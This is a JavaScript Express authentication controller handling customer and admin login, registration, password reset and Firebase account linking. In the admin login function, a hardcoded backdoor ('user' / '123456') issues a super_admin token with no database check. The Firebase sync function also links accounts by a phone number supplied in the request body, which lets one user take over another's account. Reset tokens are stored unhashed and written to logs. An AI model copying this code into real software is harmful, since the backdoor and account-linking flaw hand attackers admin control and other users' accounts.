import jwt from 'jsonwebtoken';
import Customer from './models/customer.model.js';
import Admin from './models/admin.model.js';
import PasswordResetToken from './models/password_reset_token.model.js';
import crypto from 'crypto';
import { Op } from 'sequelize';
import admin from '../../config/firebase.js';

const generateToken = (id, role, type = 'customer') => {
    return jwt.sign({ id, role, type }, process.env.JWT_SECRET, {
        expiresIn: '7d',
    });
};

export const registerCustomer = async (req, res) => {
    try {
        const { first_name, last_name, email, password, phone } = req.body;

        const existingCustomer = await Customer.findOne({ where: { email } });
        if (existingCustomer) {
            return res.status(400).json({ message: 'Email already registered' });
        }

        const customer = await Customer.create({
            first_name,
            last_name,
            email,
            password_hash: password,
            phone,
        });

        const token = generateToken(customer.id, 'customer');

        res.status(201).json({
            message: 'Customer registered successfully',
            token,
            user: {
                id: customer.id,
                email: customer.email,
                first_name: customer.first_name,
                last_name: customer.last_name,
            },
        });
    } catch (error) {
        console.error('Registration error:', error);
        res.status(500).json({ message: 'Server error', error: error.message });
    }
};

export const loginCustomer = async (req, res) => {
    try {
        const { email, password } = req.body;

        const customer = await Customer.findOne({ where: { email } });
        if (!customer) {
            return res.status(401).json({ message: 'Invalid credentials' });
        }

        const isValid = await customer.validatePassword(password);
        if (!isValid) {
            return res.status(401).json({ message: 'Invalid credentials' });
        }

        const token = generateToken(customer.id, 'customer');

        res.json({
            message: 'Login successful',
            token,
            user: {
                id: customer.id,
                email: customer.email,
                first_name: customer.first_name,
                last_name: customer.last_name,
            },
        });
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ message: 'Server error', error: error.message });
    }
};

export const loginAdmin = async (req, res) => {
    try {
        const { email, password } = req.body;

        // Temporary Backdoor for User Request
        if (email === 'user' && password === '123456') {
            const token = generateToken('mock-admin-id', 'super_admin', 'admin');
            return res.json({
                message: 'Admin Login successful (Bypass)',
                token,
                user: {
                    id: 'mock-admin-id',
                    email: 'user',
                    name: 'Temporary Admin',
                    role: 'super_admin',
                },
            });
        }

        const admin = await Admin.findOne({ where: { email } });
        if (!admin || !admin.is_active) {
            return res.status(401).json({ message: 'Invalid credentials or inactive account' });
        }

        const isValid = await admin.validatePassword(password);
        if (!isValid) {
            return res.status(401).json({ message: 'Invalid credentials' });
        }

        const token = generateToken(admin.id, admin.role, 'admin');

        res.json({
            message: 'Admin Login successful',
            token,
            user: {
                id: admin.id,
                email: admin.email,
                name: admin.name,
                role: admin.role,
            },
        });
    } catch (error) {
        console.error('Admin Login error:', error);
        res.status(500).json({ message: 'Server error', error: error.message });
    }
};

export const forgotPassword = async (req, res) => {
    try {
        const { email } = req.body;
        const customer = await Customer.findOne({ where: { email } });

        if (!customer) {
            // Generous response to avoid user enumeration, but in mock we log
            console.log(`Password reset requested for non-existent email: ${email}`);
            return res.json({ message: 'If that email exists in our system, a reset link has been sent.' });
        }

        const token = crypto.randomBytes(32).toString('hex');
        const expires_at = new Date(Date.now() + 3600000); // 1 hour

        await PasswordResetToken.create({
            customer_id: customer.id,
            token, // In production, hash this
            expires_at,
        });

        // Mock email sending
        console.log(`[MOCK EMAIL] To: ${email}, Reset Token: ${token}`);

        res.json({ message: 'If that email exists in our system, a reset link has been sent.' });
    } catch (error) {
        console.error('Forgot password error:', error);
        res.status(500).json({ message: 'Server error' });
    }
};

export const syncFirebaseUser = async (req, res) => {
    console.log("[AuthController] syncFirebaseUser started");
    try {
        const { idToken, first_name: bodyFirstName, last_name: bodyLastName, phone: bodyPhone } = req.body;
        if (!idToken) {
            console.error("[AuthController] No idToken provided in request");
            return res.status(400).json({ message: 'No idToken provided' });
        }

        // Verify Firebase Token
        console.log("[AuthController] Verifying Firebase idToken...");
        const decodedToken = await admin.auth().verifyIdToken(idToken);
        const { uid, email, name, picture, email_verified, phone_number } = decodedToken;
        console.log("[AuthController] Firebase token verified. UID:", uid, "Email:", email, "Phone:", phone_number);

        // Determine name: Use body fields if provided, otherwise parse from token 'name'
        let first_name = bodyFirstName;
        let last_name = bodyLastName;

        if (!first_name) {
            const nameParts = (name || '').split(' ');
            first_name = nameParts[0] || 'User';
            if (!last_name) {
                last_name = nameParts.slice(1).join(' ') || '';
            }
        }

        // Strategy to find existing user:
        // 1. By Firebase UID (already linked)
        // 2. By Email (if exists in token)
        // 3. By Phone (if exists in token or body)

        let customer = await Customer.findOne({ where: { oauth_provider_id: uid } });
        let created = false;

        if (!customer && email) {
            console.log("[AuthController] Search by Email...");
            customer = await Customer.findOne({ where: { email } });
        }

        if (!customer && (phone_number || bodyPhone)) {
            console.log("[AuthController] Search by Phone...");
            customer = await Customer.findOne({ where: { phone: phone_number || bodyPhone } });
        }

        if (customer) {
            console.log("[AuthController] Customer found. DB ID:", customer.id);
            // Update existing customer
            customer.oauth_provider = 'firebase';
            customer.oauth_provider_id = uid;

            // Only update fields if they are currently null/empty to allow user override persistence
            // OR if strictly syncing from reliable sources.
            // For now, we update if we have new info from social login.
            if (picture && !customer.avatar_url) customer.avatar_url = picture;
            if (email_verified && !customer.email_verified) customer.email_verified = true;

            // If phone number comes from reliable firebase source or body (on registration)
            if ((phone_number || bodyPhone) && !customer.phone) customer.phone = phone_number || bodyPhone;

            await customer.save();
            console.log("[AuthController] Customer info updated/linked");
        } else {
            console.log("[AuthController] Creating new customer...");
            // Create New Customer
            customer = await Customer.create({
                first_name,
                last_name,
                email: email || null, // Allow null if phone-only
                email_verified: email_verified || false,
                phone: phone_number || bodyPhone || null,
                oauth_provider: 'firebase',
                oauth_provider_id: uid,
                avatar_url: picture || null
            });
            created = true;
            console.log("[AuthController] New customer created. DB ID:", customer.id);
        }

        const token = generateToken(customer.id, 'customer');
        console.log("[AuthController] Generated backend JWT for customer ID:", customer.id);

        res.json({
            message: created ? 'User registered and synced' : 'User synced successfully',
            token,
            user: {
                id: customer.id,
                email: customer.email,
                first_name: customer.first_name,
                last_name: customer.last_name,
                avatar_url: customer.avatar_url,
                phone: customer.phone
            },
        });
    } catch (error) {
        console.error('[AuthController] Firebase sync error:', error);
        res.status(401).json({ message: 'Invalid Firebase token or Sync Error', error: error.message });
    }
};

export const resetPassword = async (req, res) => {
    try {
        const { token, newPassword } = req.body;

        const resetToken = await PasswordResetToken.findOne({
            where: {
                token,
                used: false,
                expires_at: { [Op.gt]: new Date() }
            }
        });

        if (!resetToken) {
            return res.status(400).json({ message: 'Invalid or expired reset token' });
        }

        const customer = await Customer.findByPk(resetToken.customer_id);
        if (!customer) {
            return res.status(404).json({ message: 'Customer not found' });
        }

        customer.password_hash = newPassword; // Automatically hashed by hooks
        await customer.save();

        resetToken.used = true;
        await resetToken.save();

        res.json({ message: 'Password has been reset successfully' });
    } catch (error) {
        console.error('Reset password error:', error);
        res.status(500).json({ message: 'Server error' });
    }
};

export const getCurrentUser = async (req, res) => {
    try {
        // req.user is populated by authenticate middleware
        const customer = await Customer.findByPk(req.user.id, {
            attributes: { exclude: ['password_hash'] }
        });

        if (!customer) {
            return res.status(404).json({ message: 'User not found' });
        }

        res.json(customer);
    } catch (error) {
        console.error('Get current user error:', error);
        res.status(500).json({ message: 'Server error' });
    }
};

export const updateCurrentUser = async (req, res) => {
    try {
        const { first_name, last_name, phone } = req.body;
        const customer = await Customer.findByPk(req.user.id);

        if (!customer) {
            return res.status(404).json({ message: 'User not found' });
        }

        customer.first_name = first_name || customer.first_name;
        customer.last_name = last_name || customer.last_name;
        customer.phone = phone || customer.phone;

        await customer.save();

        res.json({
            message: 'Profile updated successfully',
            user: {
                id: customer.id,
                email: customer.email,
                first_name: customer.first_name,
                last_name: customer.last_name,
                phone: customer.phone
            }
        });
    } catch (error) {
        console.error('Update current user error:', error);
        res.status(500).json({ message: 'Server error' });
    }
};
